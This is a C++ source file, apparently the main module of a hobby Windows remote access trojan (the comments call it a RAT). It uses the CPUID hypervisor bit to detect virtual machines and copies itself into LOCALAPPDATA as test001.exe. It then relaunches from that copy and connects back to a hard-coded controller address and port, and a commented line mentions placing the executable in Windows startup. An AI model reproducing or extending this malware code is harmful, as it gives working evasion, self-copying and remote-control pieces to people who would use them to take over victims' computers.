#include <iostream>
#include <intrin.h>
#include "Connection.h"


//Check if the software running on VM
bool vmCheck() {
    unsigned int info[4]; // EAX , EBX , ECX , EDX
    //
    __cpuid((int *) info, 1); // 1 is pass to EAX
    //Checking if the 31st bit of EXC is true or false
    return ((info[2] >> 31) == 1); //if its 1 so the exe running on vm if not so its running on physical machine
}

//Creating a new same RAT in C:\\C_projects\\test001.exe
bool moveFilePlace() {
    TCHAR szExeFileName[MAX_PATH];
    ::GetModuleFileNameA(NULL, szExeFileName, MAX_PATH);
    string fileName = "";
    for (auto chr : szExeFileName) {
        fileName += chr;
    }

    string path = getenv("LOCALAPPDATA");
    path += "\\test001.exe";

    if (!fileName.rfind("test001.exe")) {
        return false;
    }


    HANDLE hFileRead = ::CreateFileA(szExeFileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                                     OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hFileWrite = ::CreateFileA(path.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                      NULL,
                                      CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    cout << "path is " << path << endl;
    if (hFileRead == INVALID_HANDLE_VALUE) {
        cout << "Cant open handle to the file" << endl;
        CloseHandle(hFileRead);
        return false;

    } else if (hFileWrite == INVALID_HANDLE_VALUE) {
        cout << "Cant open handle to file2" << endl;
        CloseHandle(hFileWrite);
        return false;
    }

    vector<char> buffer(BUFFER_SIZE + 1, 0);
    DWORD bytesRead = sizeof(bytesRead);
    while (bytesRead != 0) {
        ::ReadFile(hFileRead, buffer.data(), BUFFER_SIZE, &bytesRead, NULL);
        ::WriteFile(hFileWrite, buffer.data(), bytesRead, NULL, NULL);
    }
    CloseHandle(hFileWrite);
    CloseHandle(hFileRead);
    return true;
}

int main() {
    //Checking if the file test001.exe is exist
    if (!moveFilePlace()) {
        string path = getenv("LOCALAPPDATA");
        cout << "The command is " << "cd " + path + "&& start test001.exe" << endl;
        system(("cd " + path + "&& start test001.exe").c_str());
        return 0;
    } else {
        //::ShowWindow(::GetConsoleWindow(), SW_SHOW);fdsafdsafdsaf
        //string ip = "141.226.121.68";
        string ip = "192.168.1.210";
        int port = 9087;
        Connection *connection = new Connection(ip, port);
        BOOL success = connection->boot();
        //if (success)
        //connection->sendMessage("Can't place the exe in the windows boot startup");
        //else
        //connection->sendMessage("The exe is in windows boot startup");
        connection->connection();
    }
    return 0;
}
